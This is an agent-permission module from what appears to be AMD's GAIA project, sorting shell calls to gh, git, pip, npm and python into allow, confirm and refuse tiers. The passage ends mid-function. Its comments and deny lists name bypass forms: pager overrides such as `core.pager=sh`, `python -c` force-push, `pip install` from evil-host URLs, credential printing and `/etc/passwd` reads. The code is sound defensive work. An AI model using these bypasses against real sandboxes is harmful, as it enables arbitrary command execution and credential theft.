# Copyright(C) 2025-2026 Advanced Micro Devices, Inc. All rights reserved.
# SPDX-License-Identifier: MIT
"""
The ``shell:execute:<binary>`` bridge — a skill brings its own CLI.

A skill that needs GitHub does not need a bespoke connector; it needs ``gh``.
Declaring ``shell:execute:gh`` in ``SKILL.md`` grants **that one binary**, to
**that one skill's session**, on **that one agent instance**, restricted to the
subcommands named in :data:`BINARY_POLICIES` below.

Every invocation lands in exactly one of **three** tiers
(:func:`classify_invocation`):

* ``ALLOW`` — a read. Runs with no prompt: loading the skill is the consent, and
  a triage is five to ten reads.
* ``CONFIRM`` — a bounded write (``gh issue comment``). The user is shown the
  **exact command** and answers yes / no / always-for-this-command-class. It
  never runs on its own.
* ``REFUSE`` — never runs, and never raises a prompt. Reserved for the
  escalation classes a single yes/no cannot honestly describe: printing a
  credential (``gh auth token``), defining or installing code that then runs
  (``gh alias``, ``gh extension``, ``gh config``), and the unbounded generic
  surfaces (any ``gh api`` write, which is "do anything to any resource" behind
  one flag).

Keeping CONFIRM and REFUSE apart is the point. Collapsing them into one prompt
turns the gate into a habit — click yes, and yes covers ``gh auth token`` too.

Four properties make this safe enough to bridge while the general shell sandbox
is still deferred:

1. **Deny by default at two levels.** A binary with no entry here cannot be
   declared at all, and a subcommand absent from its entry is refused. Nothing is
   permitted by omission — and nothing is *confirmable* by omission either: a
   write reaches the CONFIRM tier only by being listed in ``confirm_actions``.
2. **No global state.** The grant lives on the agent instance
   (:class:`BinaryGrants`), never in a module-level allowlist. One agent's skill
   can never widen another agent's shell.
3. **A write executes only behind the agent's confirmation gate.** This module
   classifies; it does not enforce consent. ``Agent._execute_tool`` is what
   actually stops a CONFIRM call — the same single funnel that has always gated
   ``write_file`` — and ``ShellToolsMixin.skill_grant_covers_call`` exempts only
   the ALLOW tier from it. A caller wanting "may this run with nobody asked?"
   uses :func:`validate_invocation`, which answers no for CONFIRM and REFUSE
   alike, so an un-updated caller fails closed.
4. **Read-only by construction — for CLIs that talk to something *external*.**
   ``pytest`` is a different class of grant and says so in its own summary: it
   EXECUTES the project's own test code, the same trust boundary as the ungated
   ``execute_python_file`` tool. What its table restricts is invocation shape
   (no plugin injection, no interactive hang, no writes/paths outside the
   checkout) — never what the tests themselves do. It has no CONFIRM tier.

Adding a CLI is a data entry here plus a ``SKILL.md`` — never a new branch in the
shell tool. That is the acceptance test for this module: supporting GitLab must
be ``"glab": BinaryPolicy(...)`` and nothing else.

**The bypass class this table is really about.** Almost every CLI worth granting
can be talked into running a *different* program: ``git -c core.pager=sh``,
``python -c``, ``npm run``, ``go test -exec``, ``pip install <url>``,
``find -exec``. An entry that lists subcommands and stops has granted the shell
under a narrower name (CWE-184). Four mechanisms answer it, in rough order of
how much they carry:

* the **action-first rule** — nothing may sit between a subcommand and its
  action, so GAIA's verdict and the CLI's dispatch are the same token;
* **leading flags are refused** unless listed in ``bare_flags``, which is what
  puts ``git -c``, ``git --git-dir``, ``go -C`` and ``pip -i`` out of reach
  before a subcommand is even read;
* :attr:`Subcommand.denied_operand_prefixes` — a *name* is a write a prompt can
  describe (``pip install requests``); a *URL* is fetch-and-run and is not;
* :attr:`Subcommand.delegate_flag` — ``python -m pytest`` is re-classified
  against pytest's own rule, so ``-m`` cannot be the way around it.

Where none of those can hold the line, the CLI does not get an entry at all.
``make`` is the standing example: its argument is a target in a file the agent
can write, so ``make test`` means "run whatever the Makefile says" and no
prompt text can honestly describe the call. There is no safe subset to list.
"""

from __future__ import annotations

import os
import re
import shutil
from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Iterable, Mapping, Sequence

from gaia.skills.errors import FORMAT_DOCS_URL, SkillPermissionError

#: A binary name is a bare executable, never a path — the grant resolves off
#: ``PATH``, so neither a declared scope nor an invoked token may name a file the
#: skill chose. Applied to both ends: ``Permission.parse`` and
#: :func:`normalize_binary`.
BINARY_NAME_RE = re.compile(r"^[a-z][a-z0-9._+-]*$")

if TYPE_CHECKING:  # ``permissions`` imports this module — keep the edge one-way.
    from gaia.skills.permissions import Permission


#: The three answers :func:`classify_invocation` can give. Strings rather than
#: an enum so a decision survives a JSON round-trip to a UI unchanged.
ALLOW = "allow"
CONFIRM = "confirm"
REFUSE = "refuse"


@dataclass(frozen=True)
class InvocationDecision:
    """What the gate decided about one invocation, and how to say it.

    Attributes:
        outcome: :data:`ALLOW`, :data:`CONFIRM`, or :data:`REFUSE`.
        message: Empty for ALLOW. For REFUSE, the actionable error the caller
            returns to the model. For CONFIRM, why the call needs a human —
            what :func:`validate_invocation` hands back to a caller that only
            knows two tiers, so it must read as an explanation, not a refusal.
    """

    outcome: str
    message: str = ""

    @property
    def allowed(self) -> bool:
        """True only for :data:`ALLOW` — a call that may run unasked."""
        return self.outcome == ALLOW

    @property
    def needs_confirmation(self) -> bool:
        """True only for :data:`CONFIRM`."""
        return self.outcome == CONFIRM


_ALLOWED = InvocationDecision(ALLOW)


@dataclass(frozen=True)
class Subcommand:
    """The rule for one ``<binary> <subcommand>`` pair — or, when set as
    :attr:`BinaryPolicy.positional`, for a binary with no subcommand at all.

    Attributes:
        actions: Allowed third tokens (``gh issue **list**``), each running with
            no prompt. Empty plus ``free_form=False`` means the subcommand takes
            no action and any action token is refused.
        confirm_actions: Action tokens that WRITE and are offered to the user as
            a confirmable action rather than refused (``gh issue **create**``).
            Disjoint from *actions* by construction — an action in both would be
            silently read-only, which is the one mistake this table must not
            make quietly, so :meth:`__post_init__` refuses it.
        free_form: The subcommand's first positional is data, not an action
            (``gh api **repos/amd/gaia**``), so it is not matched against
            *actions*. ``denied_actions`` still applies.
        denied_actions: Action tokens refused even under ``free_form``.
        denied_flags: Flags refused outright, checked BEFORE the action is
            classified — so a denied flag refuses a confirmable write too, and
            no prompt is raised for it.
        flag_values: ``{flag: allowed lowercase values}``. A listed flag must
            carry one of those values (``--method GET``).
        value_flags: Flags that consume the following token. Needed so a flag's
            value is never mistaken for the action positional.
        path_operands: For :attr:`BinaryPolicy.positional` rules only — every
            non-flag token is a path operand (pytest's test paths), not a
            single subcommand action, and each is checked for a shape that
            could escape the project (absolute, drive-letter, or ``..``).
        allowed_flags: The valueless flags this grant accepts. Always the rule
            for a :attr:`BinaryPolicy.positional` binary, and for a subcommand
            rule that sets ``strict_flags``.
        strict_flags: Make subcommand-mode flag checking an ALLOWLIST too —
            anything not in ``allowed_flags`` / ``value_flags`` / ``flag_values``
            / ``bare_flags`` is refused. Set for every CLI whose flags can name
            a PROGRAM (``go``, ``npm``, ``pip``, ``uv``). A denylist there is
            unclosable: ``go vet -vettool=./x`` runs ``./x``, npm accepts any
            config key as a flag, and the next release of either adds one this
            table has never seen. Fail closed instead — a missed flag is then a
            refusal someone reports, not a silent execution.
        inline_value_flags: Value-taking flags accepted ONLY in the attached
            ``--flag=value`` form. For a rule that refuses every operand
            (``npm ci``), the spaced form is indistinguishable from the operand
            it refuses — ``--omit dev`` and ``--omit left-pad`` parse the same
            here. Attached, the value is unambiguous, so ``npm ci --omit=dev``
            works without the value-flag that would swallow a package name.
        path_value_flags: Value-taking flags whose value is a FILE this
            command reads or writes (``go test -coverprofile=cover.out``). The
            value must stay inside the checkout, by the same lexical test that
            guards a path operand. Without it the only options are to deny the
            flag — losing an ordinary CI line — or to accept a caller-chosen
            destination anywhere on disk.
        no_operands: The subcommand takes flags and nothing else, so a bare
            call is the read and ANY positional token is refused. ``git branch``
            lists branches; ``git branch <name>`` creates one, and free-form
            would have called that a read.
        flag_value_prefixes: For positional rules — ``{flag: allowed lowercase
            value prefixes}``. Like ``flag_values`` but for a flag whose safe
            values share a prefix rather than an exact set (``-p no:...``).
        denied_flag_reasons: ``{flag: one-line reason}`` shown in the refusal.
            Falls back to a generic message when absent. Used by both rule
            shapes — a denied flag has to say *why* it is denied or the model
            retries it verbatim.
        confirm: The SUBCOMMAND is the write, so reaching it at all is CONFIRM
            (``git commit``, ``npm ci``). ``gh``'s writes sit one token deeper
            and use ``confirm_actions`` instead; a rule may not use both, since
            two write tiers on one subcommand cannot both be true.
        confirm_reason: The clause the prompt uses in place of the policy-wide
            :attr:`BinaryPolicy.confirm_summary` — what *this* subcommand does,
            in the one line a user is asked to approve. ``git checkout`` and
            ``git add`` are both writes and are not the same risk.
        denied_operand_prefixes: ``{lowercase prefix: reason}`` refused in any
            non-flag token AND in any resolved flag value. This is what keeps a
            confirmable install from becoming a fetch-and-run: ``pip install``
            of a NAME is a write a prompt can describe, ``pip install
            https://…`` (or ``-r`` pointing at a URL) is not. A ``"-"`` key
            catches the bare stdin operand — in operand position that is the
            only token that can start with a dash.

            A prefix carrying a scheme marker (``:`` or ``+``) matches ANYWHERE
            in the token, not just at the front: PEP 508 lets the name come
            first, so ``pip install pkg @ https://evil/x.whl`` is the same
            fetch-and-run as ``pip install https://evil/x.whl``.
        delegate_flag: For :attr:`BinaryPolicy.positional` rules only — the
            flag whose value names ANOTHER policed binary, so the rest of the
            invocation is re-classified against that binary's policy
            (``python -m pytest`` is checked as ``pytest``). Without it, every
            ``-m``-capable binary is a hole straight through the table.
        script_args: For positional rules only — the first path operand names a
            PROGRAM, so every token after it is that program's arguments, not
            this binary's (``python util/lint.py --all --fix``). Flag
            validation stops there; what still holds is containment — no
            argument, nor a path attached to one, may leave the checkout.
    """

    actions: frozenset[str] = frozenset()
    confirm_actions: frozenset[str] = frozenset()
    free_form: bool = False
    denied_actions: frozenset[str] = frozenset()
    denied_flags: frozenset[str] = frozenset()
    flag_values: Mapping[str, frozenset[str]] = field(default_factory=dict)
    value_flags: frozenset[str] = frozenset()
    path_operands: bool = False
    allowed_flags: frozenset[str] = frozenset()
    flag_value_prefixes: Mapping[str, frozenset[str]] = field(default_factory=dict)
    denied_flag_reasons: Mapping[str, str] = field(default_factory=dict)
    strict_flags: bool = False
    inline_value_flags: frozenset[str] = frozenset()
    path_value_flags: frozenset[str] = frozenset()
    no_operands: bool = False
    confirm: bool = False
    confirm_reason: str = ""
    denied_operand_prefixes: Mapping[str, str] = field(default_factory=dict)
    delegate_flag: str = ""
    script_args: bool = False

    def __post_init__(self) -> None:
        overlap = self.actions & self.confirm_actions
        if overlap:
            raise ValueError(
                "Subcommand actions and confirm_actions must be disjoint; "
                f"{sorted(overlap)} is in both. An action in both tiers reads "
                "as read-only and runs unprompted — the failure this table "
                "exists to prevent."
            )
        if self.confirm and self.confirm_actions:
            raise ValueError(
                "A Subcommand may set 'confirm' (the subcommand itself is the "
                "write) or 'confirm_actions' (the write is one token deeper), "
                "never both: two write tiers on one rule cannot both describe "
                f"the call, and {sorted(self.confirm_actions)} would be "
                "classified twice."
            )
        if self.confirm and not self.free_form and not self.actions:
            # `npm install` (lockfile) is CONFIRM; `npm install <pkg>` is
            # REFUSE, and the only thing separating them is that the package
            # name is read as an operand. A value-taking flag would consume it
            # instead, and the refused call would go to a prompt as the allowed
            # one — the same swallow the action-first rule exists to stop.
            # `inline_value_flags` is deliberately absent: an attached
            # value is part of its own token and swallows nothing.
            swallowers = sorted(
                set(self.value_flags)
                | set(self.flag_values)
                | set(self.flag_value_prefixes)
            )
            if swallowers:
                raise ValueError(
                    "A bare-confirm Subcommand (no actions) may declare no "
                    f"value-taking flags; {swallowers} would swallow the very "
                    "operand that distinguishes the confirmable call from the "
                    "refused one."
                )


@dataclass(frozen=True)
class BinaryPolicy:
    """Everything core knows about one skill-declarable CLI.

    Attributes:
        binary: The executable name, as declared in ``shell:execute:<binary>``.
        summary: One line for error messages and ``gaia skill info``.
        install_hint: How to get it — named in the load-time failure when the
            binary is not on ``PATH``.
        subcommands: The allowlist, keyed by subcommand. Absent == refused.
            Ignored when ``positional`` is set.
        bare_flags: Flags accepted with no subcommand at all (``gh --version``).
            Also folded into the allowlist for a ``positional`` binary, where
            *every* invocation is "no subcommand".
        positional: Set instead of ``subcommands`` for a binary whose shape is
            ``<binary> [operands] [flags]`` with no subcommand step at all
            (``pytest tests/unit -k foo``, vs. ``gh issue list``). When set,
            every token in the invocation is validated against this one rule.
        single_dash_long: This CLI spells long options with ONE dash
            (Go's standard ``flag`` package: ``-exec``, ``-ldflags``), so a
            flag token must not be read as a short flag carrying an attached
            value. Getting this wrong is a bypass, not a cosmetic difference —
            see :func:`_split_flag`.
        confirm_summary: The clause a CONFIRM prompt uses when the rule does
            not override it — "writes to GitHub", "changes this repository".
            One line, and it must be true of every write the policy offers.
        refuse_note: The closing sentence of an unknown-subcommand refusal,
            naming the classes this CLI never runs. Says what is out of reach
            so the model stops hunting for a spelling that works.
        remote_operands: This CLI's operands name things on a REMOTE service
            (``gh issue view 42``), not files on this machine, so the shell
            tool's path-traversal scan has nothing to check and skips the
            segment. False for every local CLI — ``git diff --no-index
            /etc/passwd`` and ``python ../x.py`` are exactly the reads that
            scan exists for, and a grant must not turn it off.
        ungranted: Subcommands this binary may run with **no skill grant at
            all**, and then only at the ALLOW tier. Empty for every CLI whose
            whole point is the grant (``gh``, ``pytest``). Non-empty only where
            a read-only floor predates the policy — ``git status`` has always
            been in the shell tool's whitelist, and this is where that floor
            now lives, so one table describes the binary instead of two.
    """

    binary: str
    summary: str
    install_hint: str
    subcommands: Mapping[str, Subcommand] = field(default_factory=dict)
    bare_flags: frozenset[str] = frozenset({"--version", "--help", "-h"})
    positional: Subcommand | None = None
    single_dash_long: bool = False
    confirm_summary: str = "writes"
    refuse_note: str = (
        "Anything that installs, opens a shell, or prints a credential is "
        "refused outright and cannot be approved."
    )
    remote_operands: bool = False
    ungranted: frozenset[str] = frozenset()

    def __post_init__(self) -> None:
        if bool(self.subcommands) == bool(self.positional is not None):
            raise ValueError(
                f"BinaryPolicy({self.binary!r}) must set exactly one of "
                "'subcommands' (a gh-shaped CLI) or 'positional' (a "
                "no-subcommand CLI like pytest), never both or neither."
            )
        unknown = self.ungranted - set(self.subcommands)
        if unknown:
            raise ValueError(
                f"BinaryPolicy({self.binary!r}) lists {sorted(unknown)} as "
                "runnable without a grant, but has no rule for them. The "
                "ungranted floor is a SUBSET of the policy, never a second "
                "table beside it."
            )


# ---------------------------------------------------------------------------
# The table. One entry per CLI a skill may declare.
# ---------------------------------------------------------------------------
#
# HARD-REFUSED for `gh` — never confirmable, so no prompt is ever raised for
# them. Each is an escalation of a DIFFERENT kind than "this writes to a repo",
# which is why they are not merely writes the user could approve:
#   auth token prints the credential itself (hence auth allows `status` only)
#   alias      defines an arbitrary shell command under a gh name
#   extension  installs and runs third-party code
#   config     sets the editor/pager, i.e. command execution
#   codespace  opens a remote shell
#   secret / variable / ssh-key / gpg-key   credential surfaces
#   api -X POST|PATCH|DELETE, -f/--field, --input, graphql
#              the generic surface: one prompt cannot describe "any resource,
#              any method". The named write subcommands below can.
#   pr merge / repo delete / release delete / label delete
#              irreversible on someone else's work; land or destroy, not triage
#
# ALLOWED but worth knowing: `gh issue create -T/--template` seeds the body from
# the repo's own .github/ISSUE_TEMPLATE. It reads a local file, so it is the
# same shape as --body-file — but only ever a file already published in the
# repo it posts to, so it discloses nothing new. Revisit if gh ever lets
# --template name an arbitrary path.
#
# They need no explicit block: anything not listed below is refused.
#
# CONFIRMABLE writes (`confirm_actions`) are the triage last mile — post the
# comment, file the issue, apply the label. Each shows the user the exact
# command and runs only on approval. Scope creep here is the risk the table
# guards: a write earns a place only if a single line of prompt text can
# honestly describe what it does.

_GH_API = Subcommand(
    free_form=True,
    # POST-by-default and can mutate through a query document.
    denied_actions=frozenset({"graphql"}),
    # Any field flag implies a request body, and a body implies a write.
    denied_flags=frozenset({"-f", "--field", "-F", "--raw-field", "--input"}),
    flag_values={"-X": frozenset({"get"}), "--method": frozenset({"get"})},
    value_flags=frozenset(
        {
            "-X",
            "--method",
            "-H",
            "--header",
            "--hostname",
            "-q",
            "--jq",
            "-t",
            "--template",
            "--cache",
            "-p",
            "--preview",
        }
    ),
)

_GH_COMMON_VALUE_FLAGS = frozenset(
    {
        "-R",
        "--repo",
        "-L",
        "--limit",
        "-s",
        "--state",
        "-l",
        "--label",
        "-a",
        "--assignee",
        "-A",
        "--author",
        "-S",
        "--search",
        "-q",
        "--jq",
        "-t",
        "--template",
        "--json",
        "--milestone",
        "--owner",
        "--branch",
        "--workflow",
        "--user",
        "--sort",
        "--order",
    }
)


#: Value-taking flags on gh's write subcommands. Listed for a security reason,
#: not for completeness: the action is the FIRST non-flag token, so a flag whose
#: value is not consumed leaves that value standing in as the action.
#: ``gh issue --body list comment 42`` would otherwise classify as the read
#: ``gh issue list`` and run with no prompt.
_GH_WRITE_VALUE_FLAGS = frozenset(
    {
        "-b",
        "--body",
        # gh spells these `-t/--title` and `-T/--template`; `-t` is already in
        # the common set, so only the two long forms and `-T` are new here.
        "--title",
        "-T",
        "-m",
        "-c",
        "--color",
        "-d",
        "--description",
        "-n",
        "--name",
        "-p",
        "--project",
        # gh pr create's branch selectors — value-taking, so they must be
        # declared or their value stands in as the action.
        "-H",
        "--head",
        "-B",
        "--base",
        "--add-label",
        "--remove-label",
        "--add-assignee",
        "--remove-assignee",
        "--add-project",
        "--remove-project",
        "--add-reviewer",
        "--remove-reviewer",
    }
)

#: Refused on every gh subcommand that can write, before the action is even
#: classified — so they raise no prompt. Not writes in themselves; each is a
#: different capability smuggled in on a write's back.
_GH_WRITE_DENIED_FLAGS = frozenset(
    {"-F", "--body-file", "-e", "--editor", "-w", "--web"}
)

_GH_WRITE_DENIED_FLAG_REASONS = {
    "-F": "it posts the contents of a LOCAL file to the remote — a file-read "
    "and an upload wearing an issue body's clothes. Pass the text with --body",
    "--body-file": "it posts the contents of a LOCAL file to the remote — a "
    "file-read and an upload wearing an issue body's clothes. Pass the text "
    "with --body",
    "-e": "it opens an interactive editor, which hangs an agent whose stdin is "
    "closed. Pass the text with --body",
    "--editor": "it opens an interactive editor, which hangs an agent whose "
    "stdin is closed. Pass the text with --body",
    "-w": "it opens a browser on the machine instead of returning anything, so "
    "a read gets you no output and a write you approved never happens",
    "--web": "it opens a browser on the machine instead of returning anything, "
    "so a read gets you no output and a write you approved never happens",
}


def _gh(actions: Iterable[str], confirm: Iterable[str] = ()) -> Subcommand:
    """One gh subcommand: reads that run unasked, plus writes the user approves.

    *confirm* is empty for a purely read-only subcommand. When it is not, the
    write-flag denylist comes with it — those flags are refused on the reads
    too, which costs nothing (no read accepts them) and means one rule covers
    the subcommand rather than one per action.
    """
    confirm_actions = frozenset(confirm)
    if not confirm_actions:
        return Subcommand(
            actions=frozenset(actions), value_flags=_GH_COMMON_VALUE_FLAGS
        )
    return Subcommand(
        actions=frozenset(actions),
        confirm_actions=confirm_actions,
        value_flags=_GH_COMMON_VALUE_FLAGS | _GH_WRITE_VALUE_FLAGS,
        denied_flags=_GH_WRITE_DENIED_FLAGS,
        denied_flag_reasons=_GH_WRITE_DENIED_FLAG_REASONS,
    )


# ---------------------------------------------------------------------------
# git
# ---------------------------------------------------------------------------
#
# git's dangerous surface is almost entirely made of LEADING options, and the
# action-first rule already refuses every one of them before a subcommand is
# read: `-c core.pager=sh` and `-c diff.external=sh` are arbitrary command
# execution, `--git-dir` / `--work-tree` / `-C` retarget the whole call at
# another checkout, and `--exec-path` replaces git's own helper binaries. None
# is in `bare_flags`, so none can be spelled. That is the single most
# load-bearing property of this entry.
#
# What is left are the per-subcommand escapes: a read that runs a configured
# external program (`--ext-diff`, `--textconv`, `git grep -O`) or writes a file
# (`--output`).
#
# REFUSED by simply having no rule — and each is a different kind of loss than
# "this changes the repo", which is why none is confirmable:
#   push / push --force   publishes to a remote; irreversible for everyone else
#   reset --hard, clean   destroys uncommitted work with no undo anywhere
#   rebase, filter-branch, commit --amend   rewrite history that may be published
#   config                sets core.pager / diff.external, i.e. command execution
#   submodule, worktree, clone, fetch, pull, remote add   reach the network or
#                         graft another repo's code into this one
#   merge, cherry-pick, revert, rm, mv, am, apply, gc, prune, update-ref
#                         change history or content in ways a one-line prompt
#                         understates

_GIT_READ_DENIED_FLAGS = frozenset(
    {
        "--ext-diff",
        "--textconv",
        "--filters",
        "--output",
        "-O",
        "--open-files-in-pager",
        "--no-index",
        "--upload-pack",
        "--receive-pack",
        "--exec",
    }
)

_GIT_READ_DENIED_FLAG_REASONS = {
    "--ext-diff": "it runs the program named by the repository's own "
    "diff.external setting — arbitrary command execution wearing a diff's "
    "clothes. Read the diff as git prints it",
    "--textconv": "it runs the program named by the repository's own textconv "
    "filter, which is arbitrary command execution",
    "--output": "it writes git's output to a file instead of returning it, "
    "which this grant does not cover. Read the output from stdout",
    "-O": "it launches the program you name as a pager, which is arbitrary "
    "command execution",
    "--open-files-in-pager": "it launches the program you name as a pager, "
    "which is arbitrary command execution",
    "--filters": "it runs the repository's configured smudge/clean filter, "
    "which is arbitrary command execution",
    "--no-index": "it compares two paths anywhere on the filesystem rather "
    "than anything in this repository, which turns a diff into a file read",
    "--upload-pack": "it names the program git runs on the other end of a "
    "transfer, which is arbitrary command execution",
    "--receive-pack": "it names the program git runs on the other end of a "
    "transfer, which is arbitrary command execution",
    "--exec": "it names the program git runs on the other end of a transfer, "
    "which is arbitrary command execution",
}

#: `git branch` is a read here. These turn it into a write, and one of them
#: (`-D`) throws away commits that exist nowhere else.
_GIT_BRANCH_DENIED_FLAGS = frozenset(
    {
        "-d",
        "-D",
        "--delete",
        "-m",
        "-M",
        "--move",
        "-c",
        "-C",
        "--copy",
        "-f",
        "--force",
        "-u",
        "--set-upstream",
        "--set-upstream-to",
        "--unset-upstream",
        "--edit-description",
    }
)


def _git_read(
    *,
    denied_flags: frozenset[str] = frozenset(),
    denied_flag_reasons: Mapping[str, str] | None = None,
    denied_actions: frozenset[str] = frozenset(),
    no_operands: bool = False,
    value_flags: frozenset[str] = frozenset(),
) -> Subcommand:
    """One read-only git subcommand — free-form, because its operands are
    revisions and pathspecs rather than an action word.

    git keeps a flag DENYLIST where go, npm, pip and uv get an allowlist, and
    that is a decision rather than an omission. git's dangerous options are
    almost all LEADING ones, which the action-first rule refuses outright
    before a subcommand is even read; what is left is the short, stable list
    above. Its read flags, meanwhile, number in the hundreds and are
    overwhelmingly inert, so an allowlist would refuse ordinary reads far more
    often than it caught anything — and a gate that blocks
    ``git log --format=...`` is a gate people switch off.
    """
    return Subcommand(
        free_form=True,
        no_operands=no_operands,
        value_flags=value_flags,
        denied_actions=denied_actions,
        denied_flags=_GIT_READ_DENIED_FLAGS | denied_flags,
        denied_flag_reasons={
            **_GIT_READ_DENIED_FLAG_REASONS,
            **(denied_flag_reasons or {}),
        },
    )


def _git_write(
    reason: str,
    *,
    denied_flags: frozenset[str] = frozenset(),
    denied_flag_reasons: Mapping[str, str] | None = None,
    value_flags: frozenset[str] = frozenset(),
) -> Subcommand:
    """One confirmable git write. *reason* is the line the user approves, so it
    says what this subcommand does — ``git add`` and ``git checkout`` are both
    writes and are not the same risk."""
    return Subcommand(
        free_form=True,
        confirm=True,
        confirm_reason=reason,
        value_flags=value_flags,
        denied_flags=_GIT_READ_DENIED_FLAGS | denied_flags,
        denied_flag_reasons={
            **_GIT_READ_DENIED_FLAG_REASONS,
            **(denied_flag_reasons or {}),
        },
    )


_INTERACTIVE_HANG = (
    "it waits for input on a stdin that is closed for an agent, so the command "
    "never returns. Pass what it needs on the command line instead"
)

# ---------------------------------------------------------------------------
# python, and the CLIs a build/test loop reaches for
# ---------------------------------------------------------------------------
#
# `python <script.py>` is ALLOW, and that is the widest single decision in this
# file. It is the `pytest` reasoning taken to its conclusion: running a Python
# file that is already in the checkout is exactly what the ungated
# `execute_python_file` tool does, so refusing the same act through `python`
# would be a lock on a door standing next to an open one.
#
# `python -c` is NOT that act, and is refused. Code passed on the command line
# is not in the checkout, was never reviewed, and — this is the part that
# matters — makes every other entry in this table decorative: `python -c
# "subprocess.run(['git','push','--force'])"` is one opaque token to the gate
# and a force-push to the operating system. The route to running new code is to
# write the file (which the agent's write gate shows the user) and then run it.
# `-i` and a bare `-` operand are the same hole with different spelling.

#: Every ``-m`` target must itself be policed, so ``-m`` cannot be the way
#: around a policy: ``python -m pytest --pdb`` is refused because
#: ``pytest --pdb`` is. ``pip`` is deliberately NOT here — it reaches the
#: network and installs code, a capability beyond "run this checkout's code",
#: so it needs its own ``shell:execute:pip`` grant rather than riding python's.
_PYTHON_MODULES = frozenset({"pytest", "black", "isort", "ruff"})

#: Operand shapes that turn an install into fetch-and-run of code nobody named.
#: A package NAME is a write one line of prompt can describe; a URL is not.
_REMOTE_OPERAND_REASON = (
    "it installs code fetched from a location named on the command line rather "
    "than a package named in the project's own manifest — a prompt cannot "
    "vouch for what is at that address. Add the dependency to the project's "
    "requirements/pyproject and install from there"
)

_STDIN_OPERAND_REASON = (
    "a bare '-' reads the program from stdin, which is the same "
    "arbitrary-code path as -c: nothing in the checkout was reviewed and "
    "nothing in this table can gate it"
)

_REMOTE_OPERAND_PREFIXES = {
    prefix: _REMOTE_OPERAND_REASON
    for prefix in (
        "http://",
        "https://",
        "ftp://",
        "git+",
        "hg+",
        "svn+",
        "bzr+",
        "file:",
    )
}

#: Flags that repoint a Python installer at a different index or install root.
#: A private index is a supply-chain substitution the package name never shows.
_PIP_DENIED_FLAGS = frozenset(
    {
        "-i",
        "--index-url",
        "--extra-index-url",
        "--find-links",
        "--trusted-host",
        "--target",
        "-t",
        "--prefix",
        "--root",
        "--proxy",
    }
)

_PIP_DENIED_FLAG_REASONS = {
    flag: "it points the installer at an index, mirror, or install root chosen "
    "on the command line, which substitutes what a package name means"
    for flag in _PIP_DENIED_FLAGS
}

_PIP_INSTALL_VALUE_FLAGS = frozenset(
    {"-r", "--requirement", "-e", "--editable", "-c", "--constraint"}
)

#: pip's flags are an ALLOWLIST: `--global-option`, `--install-option` and
#: `--config-settings` all hand arguments to the package's own build script, so
#: the denylist would have to stay ahead of pip's build-backend surface
#: forever. Anything absent is refused.
_PIP_COMMON_FLAGS = frozenset(
    {
        "-q",
        "--quiet",
        "-v",
        "--verbose",
        "--no-input",
        "--disable-pip-version-check",
        "--no-cache-dir",
    }
)

#: `pip list` / `show` / `freeze` / `check`. Kept SEPARATE from the install set
#: on purpose: `-f` here is `pip show --files`, and `-f` on an install is
#: `--find-links`, which is on the denylist. One shared allowlist would have
#: let the install inherit the read's spelling of a denied flag.
_PIP_READ_FLAGS = _PIP_COMMON_FLAGS | frozenset(
    {
        "--local",
        "-l",
        "--not-required",
        "--outdated",
        "--uptodate",
        "--editable-only",
        "--all",
        "--files",
        "-f",
        "--user",
    }
)

_PIP_INSTALL_FLAGS = _PIP_COMMON_FLAGS | frozenset(
    {
        "-U",
        "--upgrade",
        "--force-reinstall",
        "--no-deps",
        "--dry-run",
        "--user",
        "--no-warn-script-location",
    }
)

_PIP_READ_VALUE_FLAGS = frozenset({"--format", "--exclude", "--python-version"})

#: `uv` is not pip. Its own vocabulary — `uv sync --frozen` is the single most
#: common uv line in CI, and none of pip's flags spell it.
_UV_ALLOWED_FLAGS = _PIP_COMMON_FLAGS | frozenset(
    {
        "--frozen",
        "--locked",
        "--offline",
        "--no-dev",
        "--dev",
        "--all-extras",
        "--all-packages",
        "--all-groups",
        "--no-install-project",
        "--inexact",
        "--upgrade",
        "-U",
        "--no-sync",
        "--seed",
        "--clear",
        "--system",
        "--no-progress",
        "--outdated",
    }
)

_UV_VALUE_FLAGS = frozenset(
    {
        "--extra",
        "--group",
        "--no-group",
        "--only-group",
        "--package",
        "--python",
        "-p",
        "--depth",
        "--resolution",
        "--prerelease",
        "--upgrade-package",
        "--format",
        "--prompt",
    }
)

#: npm's own escape hatches: a different registry, a different install root, a
#: different shell to run scripts in, or a config file that sets all three.
_NPM_DENIED_FLAGS = frozenset(
    {
        "--prefix",
        "-C",
        "--registry",
        "--script-shell",
        "--userconfig",
        "--globalconfig",
        "--node-options",
        "-g",
        "--global",
    }
)

_NPM_DENIED_FLAG_REASONS = {
    "--prefix": "it installs outside this project, where nothing here can see it",
    "-C": "it runs npm against a different directory than the one that was checked",
    "--registry": "it fetches packages from a server named on the command "
    "line, which substitutes what every package name in the lockfile means",
    "--script-shell": "it picks the shell that package scripts run in, which "
    "is arbitrary command execution",
    "--userconfig": "it loads an npm config chosen on the command line, which "
    "can set the registry and the script shell together",
    "--globalconfig": "it loads an npm config chosen on the command line, "
    "which can set the registry and the script shell together",
    "--node-options": "it injects options into the node process that runs the "
    "scripts, including ones that preload arbitrary modules",
    "-g": "it installs into the machine rather than this project",
    "--global": "it installs into the machine rather than this project",
}


#: npm's flags are an ALLOWLIST because npm accepts ANY of its config keys as
#: a command-line flag — `--script-shell`, `--registry` and every future one
#: included. A denylist over an open-ended namespace is not a list, it is a
#: guess. These are the ones a build/test loop actually uses.
_NPM_ALLOWED_FLAGS = frozenset(
    {
        "--silent",
        "-s",
        "--json",
        "--long",
        "--parseable",
        "-p",
        "--all",
        "-a",
        "--no-audit",
        "--no-fund",
        "--no-progress",
        "--no-color",
        "--dry-run",
        "--if-present",
        "--ignore-scripts",
        "--legacy-peer-deps",
        "--no-save",
        "--save",
        "--save-dev",
        "--save-exact",
        "--save-optional",
        "--save-peer",
        "--package-lock-only",
        "--workspaces",
        "--include-workspace-root",
    }
)

#: Value-taking npm flags whose value is data.
_NPM_VALUE_FLAGS = frozenset(
    {
        "--depth",
        "--loglevel",
        "--omit",
        "--include",
        "--workspace",
        "-w",
        "--prefer-offline",
    }
)

#: The same flags on a rule that refuses every operand (`npm ci --omit=dev`).
#: Attached-only: spaced, `--omit dev` and `--omit left-pad` parse identically
#: here, and the second must stay refused.
_NPM_INLINE_VALUE_FLAGS = _NPM_VALUE_FLAGS


def _npm_read() -> Subcommand:
    """One read-only npm subcommand."""
    return Subcommand(
        free_form=True,
        strict_flags=True,
        allowed_flags=_NPM_ALLOWED_FLAGS,
        value_flags=_NPM_VALUE_FLAGS,
        denied_flags=_NPM_DENIED_FLAGS,
